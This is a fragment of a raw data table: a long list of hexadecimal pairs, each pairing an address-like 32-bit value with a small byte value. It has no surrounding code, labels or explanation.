0x00F11540, 0x00000032, 0x00F0FF28, 0x00000017, 0x00F0BB58, 0x0000000F, 0x00F09B50, 0x00000075, 0x00F10508, 0x00000068, 0x00F0C508, 0x00000036, 0x00F0F5F0, 0x00000040, 0x00F0E0E0, 0x0000002A, 0x00F0AB18, 0x0000005C, 0x00F10A20, 0x0000007E, 0x00F0D678, 0x0000003B, 0x00F0BD78, 0x0000006A, 0x00F0BD08, 0x0000005C, 0x00F09E30, 0x00000074, 0x00F0B860, 0x00000054, 0x00F0B570, 0x00000044, 0x00F0CED0, 0x0000005E, 0x00F096D0, 0x00000008, 0x00F0AAA0, 0x0000003D, 0x00F0E9B8, 0x0000007A, 0x00F12A80, 0x00000024, 0x00F11A40, 0x0000000F, 0x00F0A228, 0x00000005, 0x00F12358, 0x00000050, 0x00F0E258, 0x00000000, 0x00F12BD8, 0x00000061, 0x00F0A070, 0x00000032, 0x00F10DF8, 0x00000062, 0x00F097A8, 0x00000043, 0x00F0EED8, 0x00000074, 0x00F114B0, 0x00000071, 0x00F0BAB0, 0x0000002A, 0x00F125A0, 0x00000049, 0x00F0D320, 0x0000003B, 0x00F0D398, 0x00000001, 0x00F0AFE8, 0x00000021, 0x00F0E3D8, 0x00000016, 0x00F10CF0, 0x00000017, 0x00F09318, 0x00000013, 0x00F0B830, 0x00000002, 0x00F0BE80, 0x0000002A, 0x00F0BB58, 0x0000005E, 0x00F0DBF8, 0x00000001, 0x00F09BB0, 0x0000001E, 0x00F0C878, 0x00000068, 0x00F0AFA0, 0x00000019, 0x00F0B358, 0x00000066, 0x00F0BD70, 0x00000075, 0x00F0F6B0, 0x0000001C, 0x00F10120, 0x00000049, 0x00F0ADF8, 0x00000018, 0x00F0A630, 0x0000003F, 0x00F12340, 0x00000025, 0x00F0E298, 0x00000072, 0x00F0D3D0, 0x00000005, 0x00F090A8, 0x0000003A, 0x00F09D90, 0x0000003C, 0x00F0E260, 0x0000005D, 0x00F0CB08, 0x0000005C, 0x00F0BF90, 0x0000000B, 0x00F09B08, 0x00000065, 0x00F0C338, 0x00000054, 0x00F125E0, 0x00000043, 0x00F09578, 0x00000036, 0x00F0A2C8, 0x0000006F, 0x00F0B2C0, 0x0000006F, 0x00F12B88, 0x00000030, 0x00F12680, 0x0000004D, 0x00F0B538, 0x0000001F, 0x00F12878, 0x00000047, 0x00F0D3F8, 0x0000005B, 0x00F0B440, 0x00000022, 0x00F0D248, 0x00000000, 0x00F0F7F0, 0x00000074, 0x00F118E8, 0x00000063, 0x00F11A68, 0x00000034, 0x00F0CDC0, 0x0000003D, 0x00F0E6B0, 0x00000047, 0x00F11080, 0x0000007E, 0x00F09E38, 0x00000027, 0x00F0C528, 0x0000003F, 0x00F09310, 0x00000015, 0x00F11148, 0x0000005A, 0x00F0E368, 0x0000006D, 0x00F0CC08, 0x00000040, 0x00F0A9D0, 0x0000002A, 0x00F12320, 0x00000005, 0x00F09A00, 0x00000003, 0x00F11898, 0x00000024, 0x00F0F148, 0x00000059, 0x00F0F110, 0x0000001F, 0x00F0A8E8, 0x0000004F, 0x00F095B8, 0x0000005C, 0x00F0C840, 0x00000030, 0x00F0C680, 0x0000007C, 0x00F0C438, 0x00000025, 0x00F0C608, 0x0000006E, 0x00F12AC8, 0x00000042, 0x00F09E30, 0x0000000F, 0x00F0D718, 0x0000006C, 0x00F11070, 0x00000022, 0x00F0B5A0, 0x00000024, 0x00F0D388, 0x00000056, 0x00F0A3D8, 0x00000052, 0x00F12158, 0x00000042, 0x00F090A8, 0x0000006F, 0x00F0A288, 0x00000077, 0x00F09EE0, 0x0000003B, 0x00F0AB98, 0x00000013, 0x00F12C60, 0x0000006B, 0x00F0D578, 0x00000001, 0x00F0EC40, 0x0000003D, 0x00F0F530, 0x0000004B, 0x00F0D960, 0x00000033, 0x00F11340, 0x00000033, 0x00F11220, 0x0000003A, 0x00F11FE8, 0x0000004D, 0x00F11EA8, 0x00000077, 0x00F093A8, 0x00000009, 0x00F0C4D0, 0x0000002C, 0x00F091F8, 0x0000005C, 0x00F12958, 0x00000040, 0x00F0E208, 0x00000049, 0x00F0BAC8, 0x00000002, 0x00F120B8, 0x0000001E, 0x00F0F420, 0x00000040, 0x00F0D750, 0x0000003C, 0x00F0C100, 0x0000001D, 0x00F0EA18, 0x0000000F, 0x00F0C7E8, 0x00000040, 0x00F0B388, 0x00000010, 0x00F12538, 0x00000072, 0x00F0E338, 0x00000030, 0x00F0D7B0, 0x0000000A, 0x00F11088, 0x00000044, 0x00F0D770, 0x00000056, 0x00F093C0, 0x0000005C, 0x00F10348, 0x0000007C, 0x00F0E498, 0x0000004E, 0x00F0C6D8, 0x0000004F, 0x00F0C288, 0x00000020, 0x00F0A238, 0x00000036, 0x00F0E9A8, 0x00000047, 0x00F09288, 0x0000001C, 0x00F09848, 0x0000004E, 0x00F0F998, 0x00000072, 0x00F0BA30, 0x00000056, 0x00F0DF18, 0x0000005A, 0x00F0D418, 0x00000024, 0x00F100A8, 0x0000006D, 0x00F0C7A0, 0x00000012, 0x00F0E368, 0x0000003C, 0x00F0B5A8, 0x00000012, 0x00F0A480, 0x0000007D, 0x00F0BCF8, 0x0000002D, 0x00F0DC20, 0x00000079, 0x00F0D508, 0x00000025, 0x00F111E8, 0x00000043, 0x00F0F6D8, 0x00000024, 0x00F0CD48, 0x0000003E, 0x00F0CA00, 0x00000017, 0x00F0A270, 0x00000074, 0x00F0D8E0, 0x00000020, 0x00F0D810, 0x00000056, 0x00F11B50, 0x00000067, 0x00F0A120, 0x00000057, 0x00F0B6B8, 0x00000065, 0x00F0D808, 0x00000074, 0x00F09CF0, 0x00000036, 0x00F0EB88, 0x00000046, 0x00F0E3A0, 0x00000072, 0x00F093D8, 0x00000000, 0x00F0F148, 0x00000020, 0x00F0AF70, 0x00000071, 0x00F0FF68, 0x00000039, 0x00F12910, 0x00000028, 0x00F0BFF8, 0x0000004E, 0x00F10230, 0x0000001F, 0x00F0D3D8, 0x00000071, 0x00F10458, 0x00000000, 0x00F09DD8, 0x0000001F, 0x00F0EDC8, 0x00000026, 0x00F0B250, 0x0000001F, 0x00F0D1C8, 0x00000038, 0x00F0A428, 0x0000006A, 0x00F129D0, 0x00000000, 0x00F0A7D8, 0x00000018, 0x00F0B800, 0x00000008, 0x00F0D730, 0x0000006A, 0x00F117D0, 0x00000074, 0x00F0CD50, 0x00000055, 0x00F0A8D8, 0x0000002E, 0x00F0E830, 0x00000050, 0x00F0C558, 0x0000006B, 0x00F12508, 0x00000033, 0x00F11E30, 0x0000000E, 0x00F0A678, 0x0000005E, 0x00F0CDF0, 0x00000064, 0x00F0D060, 0x0000007C, 0x00F12B28, 0x0000006D, 0x00F0B080, 0x00000037, 0x00F11A28, 0x0000007A, 0x00F11898, 0x0000007A, 0x00F0B0D8, 0x00000063, 0x00F0A590, 0x00000049, 0x00F0CC08, 0x00000029, 0x00F0A118, 0x00000031, 0x00F0FE98, 0x00000047, 0x00F0C370, 0x00000056, 0x00F0C5A8, 0x00000004, 0x00F0CA28, 0x00000038, 0x00F0D818, 0x00000060, 0x00F0B0A8, 0x00000017, 0x00F09848, 0x0000003E, 0x00F0DFA8, 0x0000002F, 0x00F09720, 0x00000021, 0x00F12778, 0x0000000E, 0x00F12648, 0x00000032, 0x00F128E8, 0x0000005E, 0x00F0C0E0, 0x00000005, 0x00F0F8A8, 0x00000066, 0x00F0E198, 0x00000011, 0x00F0DB40, 0x0000006D, 0x00F0EBA0, 0x00000014, 0x00F0B9F8, 0x00000004, 0x00F0DB60, 0x00000034, 0x00F0F178, 0x00000037, 0x00F10490, 0x00000008, 0x00F10EB8, 0x0000002D, 0x00F11DA0, 0x0000000F, 0x00F0DFB8, 0x00000047, 0x00F11400, 0x00000009, 0x00F0D458, 0x00000048, 0x00F0C728, 0x00000047, 0x00F0DE80, 0x00000074, 0x00F10158, 0x0000000D, 0x00F0B0F8, 0x00000055, 0x00F126C0, 0x00000059, 0x00F0B300, 0x00000015, 0x00F0B868, 0x0000005C, 0x00F0D240, 0x00000069, 0x00F0CD48, 0x0000006E, 0x00F0CEB0, 0x00000057, 0x00F11460, 0x00000033, 0x00F12590, 0x00000063, 0x00F0AEF0, 0x00000055, 0x00F0DF38, 0x00000044, 0x00F11300, 0x0000007D, 0x00F0B318, 0x00000026, 0x00F11798, 0x00000003, 0x00F10C28, 0x0000004F, 0x00F0A1C8, 0x00000042, 0x00F0DFB0, 0x00000011, 0x00F0AB48, 0x00000055, 0x00F0C8D8, 0x00000011, 0x00F10FB0, 0x00000011, 0x00F0C1D0, 0x0000007B, 0x00F0EF90, 0x00000056, 0x00F0DD50, 0x00000020, 0x00F10CB8, 0x0000003E, 0x00F0A580, 0x0000006B, 0x00F113B0, 0x00000035, 0x00F10D00, 0x00000009, 0x00F128E0, 0x00000008, 0x00F0C1C8, 0x00000052, 0x00F119D0, 0x00000057, 0x00F0AE58, 0x00000070, 0x00F0C2E0, 0x00000011, 0x00F0C6E8, 0x0000007A, 0x00F0E120, 0x0000007E, 0x00F0EA90, 0x00000040, 0x00F11638, 0x0000004C, 0x00F125A0, 0x00000017, 0x00F0B680, 0x0000006D, 0x00F0DA28, 0x00000003, 0x00F0C9A0, 0x00000028, 0x00F0B1C8, 0x0000005C, 0x00F0C270, 0x00000004, 0x00F0E680, 0x00000061, 0x00F11420, 0x00000054, 0x00F0AD50, 0x0000005B, 0x00F10A90, 0x0000005C, 0x00F0D7D8, 0x0000003C, 0x00F0DDE8, 0x00000014, 0x00F0B450, 0x00000060, 0x00F09650, 0x0000007C, 0x00F116A8, 0x0000005D, 0x00F10000, 0x0000004C, 0x00F0BAB8, 0x0000007D, 0x00F09BE0, 0x00000063, 0x00F0B668, 0x0000005A, 0x00F0AAE0, 0x00000021, 0x00F0E428, 0x00000034, 0x00F0B568, 0x00000033, 0x00F12038, 0x00000002, 0x00F0E200, 0x00000035, 0x00F10A40, 0x0000003D, 0x00F0F398, 0x00000055, 0x00F0D5E8, 0x00000001, 0x00F100A8, 0x00000007, 0x00F0C630, 0x00000075, 0x00F10BE0, 0x0000001A, 0x00F0ADD8, 0x00000016, 0x00F0E890, 0x0000007B, 0x00F0FA58, 0x00000061, 0x00F0C4E0, 0x0000000C, 0x00F09990, 0x00000068, 0x00F0A128, 0x00000079, 0x00F09610, 0x0000005A, 0x00F0F618, 0x00000067, 0x00F12130, 0x00000003, 0x00F0CD08, 0x00000027, 0x00F0D2D8, 0x00000057, 0x00F0E0A8, 0x0000002C, 0x00F0B200, 0x00000073, 0x00F0C9D0, 0x00000050, 0x00F0B900, 0x0000006F, 0x00F0DCA0, 0x00000047, 0x00F12728, 0x00000074, 0x00F0D2D8, 0x0000006A, 0x00F0E178, 0x00000054, 0x00F0CD50, 0x00000063, 0x00F10128, 0x00000057, 0x00F0EC00, 0x0000002A, 0x00F11F98, 0x0000001E, 0x00F11540, 0x00000064, 0x00F0FBE8, 0x0000006E, 0x00F0E668, 0x0000004D, 0x00F0DB98, 0x00000072, 0x00F099C0, 0x00000071, 0x00F0DB68, 0x00000034, 0x00F0A1B0, 0x00000001, 0x00F0C988, 0x0000007A, 0x00F0D940, 0x00000021, 0x00F0A510, 0x00000075, 0x00F0EF20, 0x0000004E, 0x00F0F0D8, 0x00000053, 0x00F110A0, 0x00000052, 0x00F0EE28, 0x00000039, 0x00F0F4B0, 0x00000055, 0x00F116B0, 0x00000038, 0x00F0EB60, 0x0000001E, 0x00F09D18, 0x0000002D, 0x00F09B68, 0x00000045, 0x00F0DF58, 0x0000006C, 0x00F0D548, 0x00000003, 0x00F12C10, 0x00000015, 0x00F0BB30, 0x00000052, 0x00F097A0, 0x0000006A, 0x00F11178, 0x00000023, 0x00F10400, 0x00000067, 0x00F0D320, 0x00000033, 0x00F0A6E8, 0x00000020, 0x00F0A248, 0x00000045, 0x00F09570, 0x0000007A, 0x00F090A0, 0x00000026, 0x00F0D088, 0x0000002F, 0x00F0E150, 0x00000039, 0x00F0BB10, 0x0000007C, 0x00F102B8, 0x00000028, 0x00F12440, 0x00000028, 0x00F0A6A8, 0x00000004, 0x00F0C5E8, 0x00000046, 0x00F0D020, 0x00000043, 0x00F0E798, 0x0000005F, 0x00F0B220, 0x00000035, 0x00F0A7E8, 0x00000072, 0x00F0E038, 0x00000042, 0x00F12BE0, 0x00000058, 0x00F11CD0, 0x00000064, 0x00F11CA0, 0x00000022, 0x00F0B2A8, 0x00000066, 0x00F0E9F8, 0x0000005E, 0x00F0A7C8, 0x00000052, 0x00F0FEF8, 0x00000063, 0x00F09150, 0x0000005F, 0x00F0FF48, 0x0000002C, 0x00F0E0E8, 0x0000000F, 0x00F128C0, 0x0000002A, 0x00F0F198, 0x0000004D, 0x00F0CF40, 0x00000045, 0x00F0F330, 0x00000062, 0x00F0F3A8, 0x00000072, 0x00F0A2E0, 0x0000006F, 0x00F0D1D8, 0x00000067, 0x00F107D0, 0x00000043, 0x00F0FE38, 0x00000009, 0x00F0FAD8, 0x00000062, 0x00F0CE68, 0x0000000F, 0x00F0CD08, 0x00000067, 0x00F0E1D8, 0x00000061, 0x00F0AD58, 0x00000019, 0x00F11DB0, 0x00000039, 0x00F0B938, 0x00000004, 0x00F097A0, 0x00000020, 0x00F0A250, 0x00000053, 0x00F0E110, 0x0000002B, 0x00F0AFF0, 0x00000029, 0x00F102F8, 0x00000033, 0x00F0E1D8, 0x00000058, 0x00F123C0, 0x0000005F, 0x00F0C690, 0x00000034, 0x00F0C768, 0x00000020, 0x00F0EEA8, 0x00000034, 0x00F0B120, 0x00000024, 0x00F0D898, 0x00000067, 0x00F0ABA8, 0x00000053, 0x00F0F198, 0x00000025, 0x00F0CF70, 0x0000003E, 0x00F113F0, 0x0000002C, 0x00F0E678, 0x0000002E, 0x00F0F990, 0x00000022, 0x00F0F100, 0x00000043, 0x00F0B860, 0x00000068, 0x00F0AA50, 0x00000027, 0x00F0B8F0, 0x00000007, 0x00F0C5A0, 0x00000004, 0x00F12208, 0x0000006F, 0x00F09678, 0x00000004, 0x00F0B560, 0x0000005D, 0x00F0D820, 0x00000027, 0x00F10E30, 0x00000028, 0x00F106A0, 0x00000040, 0x00F10F08, 0x00000042, 0x00F0F580, 0x0000004B, 0x00F0CA00, 0x00000039, 0x00F0C398, 0x0000000B, 0x00F11DD0, 0x0000006F, 0x00F0C460, 0x0000006A, 0x00F0F8F8, 0x0000006B, 0x00F0DE40, 0x0000006A, 0x00F09290, 0x0000006B, 0x00F0BAF8, 0x0000003A, 0x00F0D800, 0x00000020, 0x00F0FCB0, 0x0000007B, 0x00F0B0C0, 0x00000046, 0x00F098A8, 0x00000047, 0x00F0CE18, 0x00000068, 0x00F0C090, 0x00000056, 0x00F12630, 0x00000011, 0x00F10570, 0x00000021, 0x00F0A930, 0x0000003E, 0x00F09970, 0x0000000A, 0x00F11D18, 0x00000058, 0x00F125E8, 0x0000002A, 0x00F10380, 0x00000064, 0x00F0FC80, 0x0000003C, 0x00F10310, 0x00000059, 0x00F0C010, 0x00000015, 0x00F09AF0, 0x0000004D, 0x00F0F488, 0x00000071, 0x00F0E0C0, 0x0000003F, 0x00F0A400, 0x00000060, 0x00F09C10, 0x0000004E, 0x00F0A930, 0x0000006D, 0x00F11750, 0x0000001E, 0x00F112F8, 0x0000001D, 0x00F102F8, 0x00000040, 0x00F0EF10, 0x0000002C, 0x00F10AE8, 0x00000062, 0x00F10D98, 0x00000030, 0x00F0BEB0, 0x00000069, 0x00F12C50, 0x00000007, 0x00F125D8, 0x00000011, 0x00F0A3D8, 0x00000047, 0x00F0B1E0, 0x0000006D, 0x00F09878, 0x0000007D, 0x00F0BF68, 0x00000004, 0x00F0BA98, 0x00000075, 0x00F11BD0, 0x00000067, 0x00F0DB80, 0x00000004, 0x00F0B760, 0x0000005A, 0x00F0EE18, 0x0000004D, 0x00F11060, 0x00000026, 0x00F11BE8, 0x0000001C, 0x00F098F8, 0x00000076, 0x00F11530, 0x00000073, 0x00F0E2C0, 0x00000003, 0x00F125F0, 0x00000061, 0x00F0A780, 0x00000039, 0x00F0D3A0, 0x00000035, 0x00F0D6D0, 0x0000005A, 0x00F11250, 0x00000057, 0x00F0E330, 0x00000033, 0x00F0AFC0, 0x0000002C, 0x00F0D520, 0x00000029, 0x00F0BDC0, 0x00000041, 0x00F0C2E0, 0x00000022, 0x00F0D010, 0x00000068, 0x00F0C6A0, 0x0000003E, 0x00F09408, 0x0000002A, 0x00F0FCC8, 0x0000006F, 0x00F09FF0, 0x00000003, 0x00F0DC18, 0x00000017, 0x00F0DFA0, 0x00000005, 0x00F0FDF8, 0x00000061, 0x00F0A798, 0x00000062, 0x00F0E3B8, 0x0000005A, 0x00F11308, 0x00000066, 0x00F0F560, 0x00000055, 0x00F0AF28, 0x00000059, 0x00F0F178, 0x00000072, 0x00F0C570, 0x00000071, 0x00F0A1E0, 0x00000038, 0x00F09DA0, 0x00000046, 0x00F0D740, 0x00000041, 0x00F123E8, 0x0000004E, 0x00F0EFA0, 0x00000008, 0x00F0A218, 0x00000074, 0x00F0C9D0, 0x00000078, 0x00F0C2A0, 0x0000004F, 0x00F0CC80, 0x00000002, 0x00F0A1D0, 0x00000002, 0x00F12920, 0x0000001A, 0x00F0B158, 0x00000036, 0x00F093F0, 0x0000005D, 0x00F0B1A0, 0x00000073, 0x00F0F660, 0x0000000B, 0x00F0C410, 0x0000000B, 0x00F10B08, 0x00000047, 0x00F0EA88, 0x0000006A, 0x00F0DB38, 0x0000004E, 0x00F0D608, 0x00000028, 0x00F0AE80, 0x00000066, 0x00F093A8, 0x00000071, 0x00F0C878, 0x0000005F, 0x00F09430, 0x00000052, 0x00F0A160, 0x00000075, 0x00F0CB80, 0x00000067, 0x00F0DF00, 0x0000002B, 0x00F0CD90, 0x0000007D, 0x00F09AE8, 0x00000021, 0x00F0A120, 0x0000001F, 0x00F0AD90, 0x0000001E, 0x00F0FE20, 0x00000030, 0x00F0C470, 0x00000066, 0x00F124D0, 0x00000004, 0x00F127D0, 0x00000070, 0x00F0A9A8, 0x00000003, 0x00F0B0E0, 0x00000015, 0x00F0F228, 0x0000006E, 0x00F11908, 0x00000072, 0x00F0E310, 0x0000003A, 0x00F0EED8, 0x00000008, 0x00F0D960, 0x00000016, 0x00F0CAD8, 0x00000009, 0x00F0A068, 0x00000017, 0x00F0E848, 0x00000066, 0x00F0D0E8, 0x00000025, 0x00F11510, 0x00000043, 0x00F0BDA0, 0x00000025, 0x00F10A88, 0x00000009, 0x00F0BC68, 0x00000060, 0x00F0F9C8, 0x00000017, 0x00F0E948, 0x0000004C, 0x00F0E848, 0x00000009, 0x00F0AE08, 0x00000007, 0x00F0D348, 0x00000039, 0x00F0DC40, 0x00000065, 0x00F0E360, 0x00000066, 0x00F0E980, 0x00000033, 0x00F111B8, 0x0000001B, 0x00F0E9E0, 0x00000005, 0x00F10908, 0x00000054, 0x00F0C4F0, 0x00000075, 0x00F0B858, 0x00000076, 0x00F108D8, 0x00000057, 0x00F12910, 0x00000018, 0x00F0C318, 0x00000002, 0x00F0E658, 0x00000017, 0x00F119E8, 0x0000001E, 0x00F0D3B0, 0x00000023, 0x00F0F5D0, 0x00000006, 0x00F0CEB0, 0x00000025, 0x00F0DD88, 0x00000054, 0x00F0A5C0, 0x00000029, 0x00F11BD8, 0x00000010, 0x00F09E90, 0x0000002A, 0x00F0F778, 0x00000079, 0x00F0D570, 0x0000007B, 0x00F0D488, 0x0000002B, 0x00F11B30, 0x00000021, 0x00F09178, 0x0000005E, 0x00F11E50, 0x0000005E, 0x00F10368, 0x00000008, 0x00F0B008, 0x00000032, 0x00F0B8C8, 0x00000037, 0x00F093E0, 0x00000025, 0x00F12548, 0x00000054, 0x00F11008, 0x00000011, 0x00F11B58, 0x00000034, 0x00F122B0, 0x00000079, 0x00F0E4D8, 0x00000023, 0x00F0FE20, 0x0000006D, 0x00F0F0F0, 0x00000046, 0x00F0FC78, 0x00000054, 0x00F09868, 0x00000008, 0x00F0C358, 0x0000000E, 0x00F10EC8, 0x0000007A, 0x00F0CC88, 0x0000000C, 0x00F12588, 0x0000003F, 0x00F12C10, 0x00000013, 0x00F0EEA8, 0x00000003, 0x00F12058, 0x0000003D, 0x00F0AAE0, 0x00000008, 0x00F0C948, 0x0000003F, 0x00F0CFB8, 0x00000054, 0x00F0EC38, 0x0000003C, 0x00F099B0, 0x0000000C, 0x00F115B0, 0x0000007E, 0x00F09FD0, 0x00000066, 0x00F0FA28, 0x00000040, 0x00F12990, 0x00000074, 0x00F11E08, 0x00000076, 0x00F11250, 0x0000000F, 0x00F0FD70, 0x0000003E, 0x00F11988, 0x0000001B, 0x00F0DEB8, 0x00000045, 0x00F0B148, 0x00000012, 0x00F0BF50, 0x00000001, 0x00F12268, 0x00000061, 0x00F12138, 0x00000059, 0x00F0E030, 0x00000032, 0x00F0E958, 0x00000044, 0x00F0FDB0, 0x00000011, 0x00F0CC80, 0x00000061, 0x00F09708, 0x0000007E, 0x00F12138, 0x00000008, 0x00F0FD00, 0x00000002, 0x00F0F108, 0x00000075, 0x00F09340, 0x0000002D, 0x00F09AD0, 0x00000076, 0x00F0E218, 0x00000039, 0x00F0DD38, 0x00000045, 0x00F0A1F0, 0x0000001A, 0x00F0FEC8, 0x0000006B, 0x00F11C50, 0x00000043, 0x00F0FE58, 0x00000064, 0x00F0E870, 0x0000006F, 0x00F0CE08, 0x00000019, 0x00F0B868, 0x00000025, 0x00F0E788, 0x00000005, 0x00F0A420, 0x0000005E, 0x00F09170, 0x0000005F, 0x00F0A438, 0x0000006B, 0x00F10790, 0x00000014, 0x00F0EEA8, 0x0000000B, 0x00F104E0, 0x00000023, 0x00F12048, 0x00000058, 0x00F12458, 0x0000006F, 0x00F10390, 0x0000007D, 0x00F09A10, 0x00000062, 0x00F12168, 0x0000003B, 0x00F12B20, 0x00000001, 0x00F0D788, 0x00000055, 0x00F12508, 0x0000005F, 0x00F118D8, 0x0000005D, 0x00F0E110, 0x0000003A, 0x00F12920, 0x00000077, 0x00F0D048, 0x0000005C, 0x00F0D440, 0x00000011, 0x00F0AD28, 0x0000003E, 0x00F0B240, 0x00000005, 0x00F0C928, 0x00000012, 0x00F0B310, 0x00000067, 0x00F0DE10, 0x0000000F, 0x00F0C830, 0x00000044, 0x00F0D390, 0x00000035, 0x00F0C9A8, 0x00000001, 0x00F0BD50, 0x0000006A, 0x00F0D670, 0x00000055, 0x00F0A9E0, 0x0000001A, 0x00F0FF08, 0x00000078, 0x00F121D0, 0x0000003E, 0x00F0E078, 0x00000069, 0x00F09088, 0x00000001, 0x00F0FAC8, 0x0000007D, 0x00F09688, 0x0000004A, 0x00F0B380, 0x00000024, 0x00F0EBA0, 0x00000004, 0x00F0B768, 0x0000007A, 0x00F12928, 0x00000051, 0x00F0E3D8, 0x00000020, 0x00F0A6A0, 0x00000016, 0x00F0A1C8, 0x0000006F, 0x00F115F8, 0x00000078, 0x00F0D5E0, 0x0000000E, 0x00F0C390, 0x00000039, 0x00F09628, 0x00000062, 0x00F11E50, 0x00000035, 0x00F122F8, 0x00000076, 0x00F10C30, 0x00000036, 0x00F0A918, 0x00000060, 0x00F0A5B8, 0x00000076, 0x00F0DE38, 0x00000018, 0x00F11BD0, 0x00000018, 0x00F10320, 0x0000004C, 0x00F0E420, 0x00000051, 0x00F0B3B8, 0x00000069, 0x00F0A2F0, 0x00000024, 0x00F10398, 0x00000010, 0x00F0A8C0, 0x0000005C, 0x00F0FB28, 0x00000040, 0x00F0B350, 0x00000014, 0x00F0B880, 0x00000025, 0x00F0D248, 0x0000002C, 0x00F0BFD0, 0x0000000A, 0x00F0DF78, 0x0000004D, 0x00F0AAF8, 0x00000017, 0x00F0ED78, 0x00000069, 0x00F09E60, 0x00000033, 0x00F10EB8, 0x0000005A, 0x00F09CB0, 0x0000003F, 0x00F0D170, 0x0000000B, 0x00F0EA20, 0x00000020, 0x00F0A000, 0x00000064, 0x00F0BBD0, 0x0000000D, 0x00F10600, 0x0000002F, 0x00F0A600, 0x00000056, 0x00F0F868, 0x00000069, 0x00F0B358, 0x00000079, 0x00F0F5C0, 0x00000015, 0x00F0EF90, 0x0000003C, 0x00F0D768, 0x00000000, 0x00F09598, 0x00000020, 0x00F09D00, 0x00000030, 0x00F0C5B8, 0x00000076, 0x00F0C490, 0x0000003D, 0x00F10E58, 0x00000060, 0x00F09B20, 0x0000006B, 0x00F0F908, 0x00000069, 0x00F127D8, 0x00000041, 0x00F12BB0, 0x0000003C, 0x00F09BA8, 0x00000076, 0x00F0F268, 0x00000062, 0x00F0BD98, 0x00000062, 0x00F093A0, 0x00000042, 0x00F0C0F8, 0x0000004D, 0x00F0DBF0, 0x00000046, 0x00F0D3B8, 0x0000006D, 0x00F11488, 0x00000024, 0x00F0E918, 0x00000041, 0x00F0E5C0, 0x00000008, 0x00F12520, 0x0000001E, 0x00F11CD8, 0x00000063, 0x00F0B828, 0x0000003D, 0x00F11BE8, 0x0000001E, 0x00F0C2F8, 0x00000013, 0x00F0EEF8, 0x0000001C, 0x00F0F438, 0x0000001B, 0x00F0B8A0, 0x0000001E, 0x00F0B150, 0x0000000A, 0x00F0AE28, 0x00000006, 0x00F12BE8, 0x0000001A, 0x00F12528, 0x0000000F, 0x00F0EEB0, 0x00000022, 0x00F09938, 0x00000078, 0x00F0FB38, 0x0000007A, 0x00F102F8, 0x00000038, 0x00F0D0E0, 0x0000003C, 0x00F09270, 0x00000021, 0x00F0BC10, 0x0000003D, 0x00F0D990, 0x0000002F, 0x00F0D798, 0x00000014, 0x00F0CEA8, 0x00000051, 0x00F0F2B8, 0x0000006B, 0x00F09DE8, 0x0000006D, 0x00F0A5A8, 0x0000005B, 0x00F124A0, 0x00000072, 0x00F12350, 0x00000023, 0x00F12B48, 0x00000020, 0x00F0ABC8, 0x0000000B, 0x00F10BB8, 0x00000015, 0x00F10FA8, 0x00000079, 0x00F0EA40, 0x0000007B, 0x00F0EF98, 0x00000046, 0x00F0CA60, 0x00000020, 0x00F0B0D8, 0x00000008, 0x00F11E78, 0x00000040, 0x00F120F8, 0x0000006B, 0x00F0C488, 0x0000002A, 0x00F09DA8, 0x00000026, 0x00F0D880, 0x0000005C, 0x00F09650, 0x00000034, 0x00F12818, 0x0000005F, 0x00F0EC80, 0x00000002, 0x00F0B088, 0x00000032, 0x00F0AB08, 0x00000043, 0x00F0EB98, 0x00000019, 0x00F0D5A0, 0x00000068, 0x00F0A838, 0x00000070, 0x00F10EC0, 0x0000004F, 0x00F10770, 0x0000000C, 0x00F127B8, 0x00000029, 0x00F0FAA0, 0x00000018, 0x00F10968, 0x00000025, 0x00F0CC48, 0x0000001E, 0x00F0ECC0, 0x0000006C, 0x00F0C868, 0x0000001B, 0x00F0DB10, 0x00000059, 0x00F0EF08, 0x0000004E, 0x00F0ECA0, 0x00000030, 0x00F0FE68, 0x00000020, 0x00F0F5B0, 0x0000004B, 0x00F0B7C8, 0x00000050, 0x00F11FE8, 0x0000005E, 0x00F0A0C0, 0x00000060, 0x00F10720, 0x00000050, 0x00F12A90, 0x00000036, 0x00F0CAF0, 0x0000000D, 0x00F118C8, 0x0000002A, 0x00F0F350, 0x00000038, 0x00F0F470, 0x00000045, 0x00F09780, 0x00000045, 0x00F11FE8, 0x00000005, 0x00F11360, 0x0000007D, 0x00F10870, 0x00000063, 0x00F10CC8, 0x00000010, 0x00F0C428, 0x0000006B, 0x00F0FE38, 0x0000000E, 0x00F0AAA0, 0x0000002B, 0x00F0A538, 0x00000009, 0x00F0A640, 0x00000035, 0x00F0FCB0, 0x0000002C, 0x00F0E1C8, 0x0000001D, 0x00F10808, 0x0000000E, 0x00F0E370, 0x0000000D, 0x00F12548, 0x0000007C, 0x00F107C0, 0x0000006A, 0x00F0E678, 0x00000025, 0x00F0C830, 0x0000001D, 0x00F0F508, 0x00000035, 0x00F0CCD0, 0x00000072, 0x00F0FF68, 0x00000070, 0x00F0B308, 0x00000046, 0x00F0B768, 0x0000005A, 0x00F11840, 0x00000046, 0x00F103D8, 0x00000046, 0x00F124A8, 0x0000000A, 0x00F0F778, 0x0000002E, 0x00F0CFE0, 0x00000061, 0x00F09440, 0x0000006A, 0x00F0E518, 0x00000003, 0x00F0F880, 0x0000003E, 0x00F0D300, 0x00000079, 0x00F10618, 0x00000066, 0x00F0BD48, 0x0000000C, 0x00F0A540, 0x00000001, 0x00F09A28, 0x00000070, 0x00F0ED80, 0x00000005, 0x00F09288, 0x00000002, 0x00F0B5B8, 0x0000002A, 0x00F117A8, 0x0000005E, 0x00F0FD88, 0x0000006A, 0x00F0F140, 0x0000001A, 0x00F0BF38, 0x0000005C, 0x00F0EE30, 0x0000004F, 0x00F0FB90, 0x0000004C, 0x00F09D00, 0x00000071, 0x00F0ADB8, 0x00000025, 0x00F0D1E0, 0x00000009, 0x00F100A0, 0x0000004B, 0x00F0AA38, 0x00000026, 0x00F0B610, 0x00000046, 0x00F126F8, 0x0000007C, 0x00F12018, 0x00000069, 0x00F0D228, 0x00000019, 0x00F0D570, 0x0000005D, 0x00F0C558, 0x00000060, 0x00F12740, 0x0000002A, 0x00F0D290, 0x0000004C, 0x00F0F268, 0x0000005D, 0x00F09290, 0x0000005C, 0x00F0ED80, 0x00000042, 0x00F0AA68, 0x0000006B, 0x00F116B8, 0x00000047, 0x00F0F6B0, 0x00000054, 0x00F0EF98, 0x0000007B, 0x00F11430, 0x00000067, 0x00F10130, 0x00000055, 0x00F10080, 0x00000060, 0x00F11E30, 0x00000021, 0x00F0B1F0, 0x00000033, 0x00F0C348, 0x0000003E, 0x00F11110, 0x0000005F, 0x00F0C888, 0x00000022, 0x00F0A548, 0x00000031, 0x00F0FC90, 0x00000029, 0x00F106E8, 0x00000022, 0x00F0B7C8, 